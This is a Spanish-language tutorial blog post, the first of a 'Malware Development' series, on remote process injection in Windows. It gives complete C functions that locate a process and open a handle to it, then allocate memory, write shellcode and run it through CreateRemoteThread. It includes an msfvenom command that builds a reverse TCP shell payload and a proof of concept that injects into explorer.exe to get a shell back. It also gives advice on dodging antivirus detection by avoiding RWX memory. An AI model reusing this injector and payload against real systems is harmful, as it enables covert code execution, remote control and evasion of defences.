---
title: "Process Injection Parte 1: Inyección Remota Básica"
date: 2024-12-19 00:00:00
categories:
  - Malware Development
  - Process Injection
tags:
  - maldev
author: 0xB3L14L
description: Primera parte de esta serie de Inyección de Proceso, donde se mostrará una simple inyección con las funciones VirtuAllocEx, WriteProcessMemory, y CreateRemoteThread del WinAPI. Siendo esto la base para las técnicas futuras.
lang: es
top_img: /img/Process-Injection-Shellcode/Remote_Process_Injection.png
cover: /img/Process-Injection-Shellcode/Remote_Process_Injection.png
---

La **Inyección de Proceso** es una técnica que se utiliza para inyectar un payload en la memoria de un proceso, este payload puede ser un shellcode o un DLL. Esta técnica tiene tres pasos fundamentales:

1. Asignar un espacio en la memoria (buffer).
2. Escribir el payload en el buffer.
3. Ejecutar el payload.

Estos tres pasos sirven para hacer una inyección local, y dependiendo de la subtécnica de inyección se aumentarán los pasos.

Para hacer la inyección a un proceso remoto se debe realizar los siguientes pasos:

1. Encontrar el proceso remoto. (***`CreateToolHelp32Snapshot`, `Process32First`, `Process32Next`***)
2. Conseguir un handle al proceso remoto. (***`OpenProcess`***)
3. Asignar un buffer en el proceso remoto. (***`VirtualAllocEx`***)
4. Escribir el shellcode en el buffer. (***`WriteProcessMemory`***)
5. Asignar el permiso de ejecución **"X"** al buffer. (***`VirtualProtectEx`***)
6. Ejecutar el buffer. (***`CreateRemoteThread`***)

El shellcode que se va a utilizar será generado por msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -a x64 -f c --platform windows
```

## **Encontrar Proceso Remoto**

Para poder hacer la inyección del shellcode se necesita el PID del proceso remoto, el PID es un valor arbitrario, cada vez que un programa se ejecuta va a tener un PID distinto.

![hSnasphot](/img/Process-Injection-Shellcode/PIS-notepad-1.png)
_Primera vez que se ejecuta el notepad, tiene el PID `6716`_

![hSnasphot](/img/Process-Injection-Shellcode/PIS-notepad-2.png)
_Segunda vez que se ejecuta el notepad, ahora tiene el PID `1036`_

Una manera de encontrar el PID de un proceso, es por medio de su archivo EXE (ejecutable). Por ejemplo, el notepad se ejecuta a través del ejecutable **`notepad.exe`**, se puede hacer un bucle que enumere todos los procesos comparando su archivo EXE con **`notepad.exe`**, y si existe, que obtenga su PID para hacer la inyección.

Se lo puede realizar con la función **`CreateToolHelp32Snasphot`**. Si se quiere utilizar esta función se debe colocar el header **`tlhelp32.h`**.

### CreateToolHelp32Snapshot

Con esta función se toma una captura de todos los procesos, hilos, y módulos que se están ejecutando en el sistema.
Sus parámetros:

```c
HANDLE CreateToolhelp32Snapshot(
  [in] DWORD dwFlags,
  [in] DWORD th32ProcessID
);
```

**dwFlags:** Sirve para especificar que parte del sistema se va a incluir en el snapshot. Ya que se quiere un snapshot de todos los procesos que están corriendo, se coloca la opción **`TH32CS_SNAPPROCESS`**.

**th32ProcessID:** Se lo utiliza para especificar el PID de un proceso en particular cuando se hace un snapshot de los hilos o módulos. En esta técnica va a ser un snapshot a todos los procesos, entonces se coloca **`NULL`**.

![hSnasphot](/img/Process-Injection-Shellcode/PIS-hSnapshot.png)

### PROCESSENTRY32

Es una estructura que va a contener la información del proceso que se obtuvo a traves del snapshot.

```c
typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;
  DWORD     cntUsage;
  DWORD     th32ProcessID;
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  CHAR      szExeFile[MAX_PATH];
} PROCESSENTRY32;
```
La documentación de Microsoft indica que el miembro **`dwSize`** se debe inicializar, y el valor debe ser igual al tamaño de PROCESSENTRY32, de lo contrario la función **`Process32First`** fallaría.

![PROCESSENTRY32](/img/Process-Injection-Shellcode/PIS-Pe32.png)

### Process32First

Regresa la información del primer proceso encontrado en el snapshot

```c
BOOL Process32First(
  [in]      HANDLE           hSnapshot,
  [in, out] LPPROCESSENTRY32 lppe
);
```
Solo necesita el handle al snapshot (Los **`HANDLE`** son identificadores, en este caso, un identificador al snapshot), y un puntero a la estructura de PROCESSENTRY32.

![Process32First](/img/Process-Injection-Shellcode/PIS-Process32First.png)


### Process32Next

Regresa la información del siguiente proceso encontrado en el snapshot.

```c
BOOL Process32Next(
  [in]  HANDLE           hSnapshot,
  [out] LPPROCESSENTRY32 lppe
);
```
También necesita el snapshot, y el puntero al PROCESSENTRY32.

![Process32Next](/img/Process-Injection-Shellcode/PIS-Process32Next.png)

Para hacer la comparación, se puede utilizar un bucle de tipo **`do-while`**.

### **OpenProcess - Handle al proceso remoto**

Solo se necesita abrir el proceso con OpenProcess.

```c
HANDLE OpenProcess(
  [in] DWORD dwDesiredAccess,
  [in] BOOL  bInheritHandle,
  [in] DWORD dwProcessId
);
```
El primer parámetro especifica los derechos de acceso, se puede colocar **`PROCESS_ALL_ACCESS`**. El segundo sirve para indicar si los procesos hijos hereden el HANDLE, no es necesario, se coloca **`FALSE`**. El tercer parámetro, es el PID del proceso obtenido con el snapshot, por ende se encuentra en PROCESSENTRY32.

![OpenProcess](/img/Process-Injection-Shellcode/PIS-do-while.png)

> Se puede crear una función que se encargue de obtener el handle al proceso remoto. Esta función solo tendrá dos parámetros: el nombre del ejecutable (**`szProcessName`**), y el handle al proceso (**`hProcess`**).
{: .prompt-info}

## **Función GetRemoteProcessHandle**
```c
BOOL GetRemoteProcessHandle(LPCWSTR szProcessName, HANDLE *hProcess) {

	HANDLE hSnapshot = NULL;

	PROCESSENTRY32 pe32 = {
		.dwSize = sizeof(PROCESSENTRY32)
	};

	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	Process32First(hSnapshot, &pe32);

	do
	{
		if (wcscmp(pe32.szExeFile, szProcessName) == 0) {
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
			CloseHandle(hSnapshot);
			return TRUE;
		}

	} while (Process32Next(hSnapshot, &pe32));

	CloseHandle(hSnapshot);
	return FALSE;
}
```

## **Asignar Buffer**

Ya con el HANDLE al proceso remoto, se debe crear un buffer con los permisos adecuados. En este buffer se va colocar el shellcode.

### VirtualAllocEx

La función tiene los siguientes parámetros:
```c
LPVOID VirtualAllocEx(
  [in]           HANDLE hProcess,
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```
El primer parámetro es el HANDLE al proceso, el segundo sirve para determinar en donde se colocará el buffer, se puede colocar **NULL**. El tercero es el tamaño del buffer que debe ser igual al tamaño del shellcode. El cuarto parámetro se debe especificar el tipo de asignación. Para este caso serán **`MEM_COMMIT`** y **`MEM_RESERVE`**. Si se quiere escribir en la asignación (**`MEM_COMMIT`**), primero se debe reservar (**`MEM_RESERVE`**). 

En el último parámetro se coloca los permisos del buffer, una opción puede ser **`PAGE_EXECUTE_READWRITE`**. El problema de esta opción es que al darle todos los permisos al mismo tiempo a un buffer, puede ser un indicativo de malware y ser bloqueado por el AV. Debido a esto, es mas conveniente solo colocar permisos de lectura y escritura, y luego de escribir el shellcode en el buffer con **`WriteProcessMemory`** se cambia los permisos con **`VirtualProtectEx`**.

![VirtualAllocEx](/img/Process-Injection-Shellcode/PIS-VirtualAllocEx.png)

## **Escribir en el Buffer**

Ahora a escribir el shellcode en el buffer.

### WriteProcessMemory

```c
BOOL WriteProcessMemory(
  [in]  HANDLE  hProcess,
  [in]  LPVOID  lpBaseAddress,
  [in]  LPCVOID lpBuffer,
  [in]  SIZE_T  nSize,
  [out] SIZE_T  *lpNumberOfBytesWritten
);
```
Se necesita el HANDLE del proceso, el puntero al buffer, el puntero al shellcode, el número de bytes que se van a escribir, esto es igual al tamaño del buffer. Y por último, si se desea, se coloca un puntero a una variable que va a contener la cantidad de bytes escritos, no es importante (**`lpNumberOfBytesWritten == sShellcodeSize`**), y se lo puede omitir.

![WriteProcessMemory](/img/Process-Injection-Shellcode/PIS-WriteProcessMemory.png)

## **Cambiar los permisos del buffer**

El Shellcode ya está escrito en el buffer. Lo siguiente es cambiar los permisos del buffer, por ahora solo se puede leer y escribir, pero no tiene los permisos de ejecución.

### VirtualProtectEx

```c
BOOL VirtualProtectEx(
  [in]  HANDLE hProcess,
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```
Esta función necesita el HANDLE al proceso, el puntero al buffer, el tamaño del buffer.

Lo nuevo es **`flNewProtect`**, aquí se especifica el nuevo tipo de protección de memoria, o el nuevo permiso que va a tener el buffer. Es necesario que el buffer tenga la capacidad de poder ejecutar su contenido, por ello se coloca **`PAGE_EXECUTE_READ`**.

El último parámetro es un puntero a una variable que va a recibir el tipo de protección previo al cambio.

![VirtualProtectEx](/img/Process-Injection-Shellcode/PIS-VirtualProtectEx.png)

## **Ejecutar el shellcode**

Se logró conseguir un handle al proceso remoto, se le asignó un buffer, se escribió el shellcode en el buffer, y se le otorgó los permisos de ejecución. Solo falta ejecutarlo, por medio de la creción de un nuevo hilo.

### CreateRemoteThread

Permite crear un hilo que se va a ejecutar en la memoria virtual del proceso remoto.

```c
HANDLE CreateRemoteThread(
  [in]  HANDLE                 hProcess,
  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  [in]  SIZE_T                 dwStackSize,
  [in]  LPTHREAD_START_ROUTINE lpStartAddress,
  [in]  LPVOID                 lpParameter,
  [in]  DWORD                  dwCreationFlags,
  [out] LPDWORD                lpThreadId
);
```
Para este caso solo se va a necesitar pasar dos argumentos, el handle del proceso (**`hProcess`**), y el buffer (**`lpStartAddress`**). Para el resto de parámetros se puede colocar NULL.

![CreateRemoteThread](/img/Process-Injection-Shellcode/PIS-CreateRemoteThread.png)

> También se puede crear una función para la inyección que constará de tres parámetros. El primero (**`hProcess`**) es el HANDLE al proceso remoto, el segundo (**`pShellcode`**) es un puntero al shellcode, y el tercero (**`sShellcodeSize`**) es el tamaño del shellcode.
{: .prompt-info}

## **Función InjectRemoteProcess**
```c
BOOL InjectRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sShellcodeSize){

	PVOID pShellcodeAddress = NULL;
	DWORD dwOldProtection = NULL;

	pShellcodeAddress = VirtualAllocEx(hProcess, NULL, sShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pShellcodeAddress == NULL){
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, pShellcodeAddress, pShellcode, sShellcodeSize, NULL)) {
		return FALSE;
	}

	memset(pShellcode, '\0', sShellcodeSize);

	if (!VirtualProtectEx(hProcess, pShellcodeAddress, sShellcodeSize, PAGE_EXECUTE_READ, &dwOldProtection)) {
		return FALSE;
	}

	if (CreateRemoteThread(hProcess, NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
		return FALSE;
	}

	return TRUE;
}
```

## **PoC - Inyección a "explorer.exe"**

Para el PoC el Windows Defender va a estar desactivado. (El malware no está empleando técnicas de evasión)

El programa fue compilado en Visual Studio, y al ejecutarlo se recibe la conexión

![revshell](/img/Process-Injection-Shellcode/PIS-revshell.png)

Utilizando la herramienta **System Informer**, en la sección **Network** se puede ver la conexión entre la máquina victima y la atacante.

![tcp](/img/Process-Injection-Shellcode/PIS-connection.png)

Aparte, se puede conocer la dirección de memoria en donde se encuentra el shellcode al imprimir la variable `pShellcodeAddress` en la función **InjectRemoteProcess**.

```c
printf("Shellcode Address: 0x%p \n", pShellcodeAddress);
```
Se puede ver los permisos del buffer.

![addr](/img/Process-Injection-Shellcode/PIS-shellcode-addr.png)

Y su contenido.

![shellcode](/img/Process-Injection-Shellcode/PIS-shellcode.png)

Por último, se puede subir el inyector a VirusTotal para saber cuantos AVs son capaces de detectarlo.

![vt](/img/Process-Injection-Shellcode/PIS-VT.png)

Hay varios factores que determinan si un ejecutable es malicioso o no, como las funciones utilizadas, las strings que contiene, etc. Existen diversas técnicas para evadir los tipos de análisis que utilizan los AV/EDR, que serán exploradas en futuros posts.

